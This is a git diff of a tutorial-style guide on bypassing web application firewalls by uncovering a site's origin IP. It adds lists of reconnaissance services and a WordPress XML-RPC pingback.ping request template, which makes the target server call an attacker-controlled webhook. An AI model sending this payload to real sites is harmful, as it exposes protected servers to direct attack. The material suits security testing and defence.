@@ -7,7 +7,7 @@ permalink: /waf-bypassing
 <link rel="stylesheet" type="text/css" href="css/font.css">
 <link rel="stylesheet" type="text/css" href="css/posts.css">
 
-### ⚠️ THIS GUIDE IN NO WAY ENDORSES ILLEGAL ACTIVITIES AND I AM NOT LIABLE FOR WHAT YOU DO WITH THE INFORMATION YOU READ HERE.THIS IS BUT A MERE GUIDE FOR PENTESTERS AND PEOPLE INTERESTED ON HOW TO KEEP THEIR WEBSITE SAFE ⚠️
+#### ⚠️ THIS GUIDE IN NO WAY ENDORSES ILLEGAL ACTIVITIES AND I AM NOT LIABLE FOR WHAT YOU DO WITH THE INFORMATION YOU READ HERE.THIS IS BUT A MERE GUIDE FOR PENTESTERS AND PEOPLE INTERESTED ON HOW TO KEEP THEIR WEBSITE SAFE ⚠️
 
 
 ### What is a firewall?
@@ -47,6 +47,7 @@ This is the easiest one since it doesn't even involve interacting directly with 
 |[dnsdumpster.com](https://dnsdumpster.com/)|✅UP|Free|
 |[shodan.io](https://shodan.io/)|✅UP|Free / Paid for more advanced scans|
 |[search.censys.io](https://search.censys.io/)|✅UP|Free / Paid for more advanced scans|
+|[fofa.info](https://en.fofa.info)|✅UP|Free / Paid for more advanced scans|
 |[Anubis (tool)](https://github.com/jonluca/Anubis)|✅UP|Free|
 
 In some cases the server will be setup in such a way that even if the unprotected IP is accessed directly, it will still show different results from the target. In such occasions, it ___might___ mean that the IP is being shared with other hosts.
@@ -69,7 +70,7 @@ That way the IP can still be accessed directly if you search it up in your searc
 
 ___PS: The IP you search up in the searchbar has to be linked to the URL you set in the "Host" header for the contents to load, since that's how the server distinguishes what website is being requested from the shared IP___
 
-#### <ins>DNS Record MethodM</ins>
+#### <ins>DNS Record Method</ins>
 When looking for IPs and unprotected subdomains, it's also important to look for IPs or domains listed mainly in **MX** and **TXT** records.
 
 |Resources|Status|Price|
@@ -78,13 +79,61 @@ When looking for IPs and unprotected subdomains, it's also important to look for
 |[dig](https://command-not-found.com/dig)|COMMAND|Free|
 
 #### <ins>IP History Method</ins>
+This method is also pretty easy. You can just get a list of the IPs that were used by the website along time. 
+
+|Resources|Status|Price|
+|---------|------|-----|
+|[viewdns.info](https://viewdns.info/)|✅UP|Free|
 
 
-#### <ins>Forensics Search Method (shodan,censys)</ins>
+#### <ins>Forensics Search Method</ins>
+This basically involves searching up the domain on the following websites.  
 
+|Resources|Status|Price|
+|---------|------|-----|
+|[shodan.io](https://shodan.io/)|✅UP|Free / Paid for more advanced scans|
+|[search.censys.io](https://search.censys.io/)|✅UP|Free / Paid for more advanced scans|
+|[fofa.info](https://en.fofa.info)|✅UP|Free / Paid for more advanced scans|
 
 #### <ins>XMLRPC.php Method (Wordpress exclusive)</ins>
+If the target uses Wordpress, it is also very likely to have XMLRPC enabled. (In some cases it doesn't tho, so that's when the rest of the things earlier apply).
 
+To bypass a WAF protecting a wordpress domain, the following method is followed:
+
+```
+POST /xmlrpc.php HTTP/1.1
+Host: TARGET_URL
+Content-Type: text/xml; charset=UTF-8
+
+<?xml version="1.0" encoding="iso-8859-1"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+ <param>
+  <value>
+   <string>WEBHOOK</string>
+  </value>
+ </param>
+ <param>
+  <value>
+   <string>VALID_POST_FROM_TARGET</string>
+  </value>
+ </param>
+</params>
+</methodCall>
+```
+
+This is an old one but incredibly still effective!
+
+What the attacker does is basically:
+
+> Replace the ```TARGET_URL``` with the url of the website.
+
+> Replace ```WEBHOOK``` with a webhook that will be used to catch the pingback response
+
+> Replace ```VALID_POST_FROM_TARGET``` with a post that's been made on the website
+
+> I.E: https://example.com/2025/03/10/is-a-nuclear-powered-marine-sector-a-possibility/
 
 #### <ins>Fingerprinting WAFs</ins>
 
